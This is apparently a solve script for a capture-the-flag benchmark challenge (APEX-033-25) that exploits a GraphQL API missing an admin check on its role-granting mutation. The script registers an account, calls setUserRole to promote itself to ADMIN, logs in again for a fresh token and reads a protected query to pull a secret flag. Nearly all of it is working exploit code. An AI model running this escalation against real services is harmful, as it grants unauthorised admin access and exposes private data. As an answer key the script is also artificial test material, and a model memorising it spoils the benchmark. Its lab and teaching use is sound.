#!/usr/bin/env bash
# APEX-033-25 — "GraphQL Mutation Authorization Bypass" (tags: graphql, privilege_escalation)
#
# The schema puts `@auth(requires: ADMIN)` on the queries that read privileged
# data and forgets it on the mutation that *grants* the privilege. So the
# protected door is answered by walking round to the one that hands out keys:
# `setUserRole` promotes the caller, and then the guarded query answers.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex033-$$"
WHO="climber$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

graphql() {
    send "$SESSION" req_0 --create \
        --set method=POST --set path=/graphql \
        --set header.Content-Type=application/json \
        --set "json.query=$1" "${@:2}"
}

"$H5I" browser open "$URL/graphql" --session "$SESSION" --new --capture >/dev/null

REPLY="$(graphql "mutation { register(username: \"$WHO\", email: \"$WHO@example.test\", password: \"password123\") { token user { id } } }")"
read -r TOKEN ID <<<"$(printf '%s' "$REPLY" | python3 -c '
import json, sys
body = json.loads(sys.stdin.read().split("\n\n", 1)[-1])
out = body["data"]["register"]
print(out.get("token", ""), out["user"]["id"])')"

graphql "mutation { setUserRole(id: \"$ID\", role: ADMIN) { id role } }" \
    --set "header.Authorization=Bearer $TOKEN" >/dev/null

# The old token still says USER: the directive reads the role out of the token,
# not out of the row it was minted from. Logging in again mints one that agrees
# with the database.
TOKEN="$(graphql "mutation { login(username: \"$WHO\", password: \"password123\") { token } }" |
    python3 -c '
import json, sys
print(json.loads(sys.stdin.read().split("\n\n", 1)[-1])["data"]["login"]["token"])')"

graphql "{ users { username role secretFlag } }" \
    --set "header.Authorization=Bearer $TOKEN" | flag
